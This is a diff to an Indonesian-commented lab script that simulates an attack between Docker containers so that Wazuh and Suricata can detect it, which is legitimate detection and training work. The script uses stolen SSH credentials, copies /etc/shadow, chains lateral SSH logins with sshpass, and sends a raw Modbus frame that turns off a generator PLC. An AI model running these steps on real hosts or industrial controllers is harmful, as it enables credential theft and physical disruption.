@@ -3,8 +3,9 @@
 #
 #   attacker(10.10.5.90)  --SSH creds curian-->  pc-staf-07(10.10.5.66)
 #     -> jalankan /tmp/exfil.sh (baca /etc/shadow)
-#     -> gerak lateral SSH ke srv-file-01(10.10.5.7)
+#     -> dari sesi itu SSH lateral ke srv-file-01(10.10.5.7)
 #     -> dari srv-file-01 kirim perintah Modbus mematikan genset di PLC(10.10.5.20)
+#   Semua langkah setelah login berjalan di dalam sesi SSH penyerang.
 #
 # Semua trafik nyata: SSH sungguhan (terekam Wazuh) dan Modbus sungguhan
 # (terdeteksi Suricata). Skrip ini hanya pemicunya.
@@ -41,17 +42,20 @@ docker exec attacker sshpass -p Mawar2024 ssh -o StrictHostKeyChecking=no \
     echo "  [pc-staf-07] /etc/shadow disalin ke /tmp/creds.txt"
   ' 2>&1 | tail -1
 
-step "3. Gerak lateral: dari pc-staf-07 SSH ke srv-file-01 (server file)"
-docker exec pc-staf-07 sshpass -p Mawar2024 ssh -o StrictHostKeyChecking=no \
-  sertu@10.10.5.7 'echo "  [srv-file-01] berhasil diakses dari pc-staf-07"' 2>&1 | tail -1
-
-step "4. Dari srv-file-01 kirim perintah Modbus: MATIKAN genset (coil0=0)"
-docker exec -i srv-file-01 python3 - <<'PY'
-import socket
+step "3. Gerak lateral: lewat sesi penyerang di pc-staf-07, SSH ke srv-file-01, lalu kirim Modbus MATIKAN genset (coil0=0)"
+# Satu rantai sesi nyata: attacker -> pc-staf-07 -> srv-file-01 -> PLC.
+# Skrip Python dikirim lewat stdin melalui kedua sesi SSH (python3 -), sehingga
+# perintah Modbus benar-benar keluar dari srv-file-01 SETELAH login lateral.
+docker exec -i attacker sshpass -p Mawar2024 ssh -o StrictHostKeyChecking=no \
+  sertu@10.10.5.66 \
+  "sshpass -p Mawar2024 ssh -o StrictHostKeyChecking=no sertu@10.10.5.7 python3 -" <<'PY'
+import socket, time
+print("  [srv-file-01] berhasil diakses dari pc-staf-07")
+time.sleep(2)   # jeda realistis antara login dan aksi
 # fc5 addr0 val 0x0000 = OFF
 s=socket.create_connection(("10.10.5.20",502),timeout=5)
 s.sendall(bytes.fromhex("000100000006010500000000")); s.recv(64); s.close()
-print("  perintah Modbus OFF terkirim ke PLC genset")
+print("  perintah Modbus OFF terkirim ke PLC genset dari srv-file-01")
 PY
 
 echo -e "\n${P}Selesai. Periksa linimasa bukti dengan: scripts/timeline.py${N}"
